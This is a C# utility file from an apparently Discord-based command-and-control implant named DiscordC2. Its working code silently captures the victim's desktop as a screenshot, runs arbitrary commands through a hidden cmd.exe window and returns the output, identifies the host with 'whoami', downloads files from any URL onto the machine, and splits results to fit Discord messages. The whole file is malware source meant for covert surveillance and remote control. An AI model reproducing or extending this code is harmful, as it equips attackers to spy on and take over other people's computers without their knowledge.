using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.Data;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using Microsoft.Extensions.DependencyInjection;
using DiscordC2.Init;

namespace DiscordC2.Common;
public static class Utils {
    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowDC(IntPtr ptr);

    [DllImport("gdi32.dll")]
    public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

    private static string _hostId = getHostId();
    public static string HostId { get; set; } = _hostId;

    public static MemoryStream GetScreenshot()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            throw new PlatformNotSupportedException("Screenshots are only supported on Windows.");
        }

        IntPtr desktop = GetDesktopWindow();
        IntPtr hdc = GetWindowDC(desktop);
        int screenWidth = GetDeviceCaps(hdc, 8); 
        int screenHeight = GetDeviceCaps(hdc, 10);
        
        var bitmap = new Bitmap(screenWidth, screenHeight);
        var graphics = Graphics.FromImage(bitmap);
        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
        var stream = new MemoryStream();
        bitmap.Save(stream, ImageFormat.Png);
        stream.Position = 0;
        return stream;
    }

    public static string ExecuteCommandline(string command)
    {
        Process process = new Process();
        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            WindowStyle = ProcessWindowStyle.Hidden,
            FileName = "cmd.exe",
            Arguments = $"/C {command}",
            RedirectStandardOutput = true,
            UseShellExecute = false
        };
        process.StartInfo = startInfo;
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        return output;
    }

    public static IEnumerable<string> Split(string str, int chunkSize)
    {
        return Enumerable.Range(0, str.Length / chunkSize)
            .Select(i => str.Substring(i * chunkSize, chunkSize));
    }

    public static IEnumerable<string> CommandOutputWrapper(string output)
    {
        IEnumerable<string> chunks = Split(output, 2000-8);
        foreach (string chunk in chunks)
        {
            yield return $"```\n{chunk}\n```";
        }
    }

    public static IEnumerable<string> MessageWrapper(string output)
    {
        IEnumerable<string> chunks = Split(output, 2000);
        foreach (string chunk in chunks)
        {
            yield return $"{chunk}";
        }
    }

    public static string getHostId() {
        return ExecuteCommandline("whoami").Trim();
    }

    public static string MD5Hash(string input) {
        MD5? md5 = Bootstrapper.ServiceProvider?.GetRequiredService<MD5>();

        if (md5 == null)
            throw new Exception("MD5 service not found");

        byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
        byte[] hashBytes = md5?.ComputeHash(inputBytes) ?? Array.Empty<byte>();
        
        return Convert.ToHexString(hashBytes);
    }

    public static string DownloadFile(string url, string path) {

        using (var client = new HttpClient())
        {
            var filename = Environment.ExpandEnvironmentVariables(path);

            try {
                var getRequest = client.GetAsync(url).Result;
                var readFile = getRequest.Content.ReadAsStreamAsync().Result;
                FileStream file = File.Create(filename);
                readFile.CopyTo(file);
                file.Close();

                if (File.Exists(filename))
                    return "success";

            } catch (InvalidOperationException e) {
                return $"error {e.Message}";
            }

        }
        
        return "error";
    }
}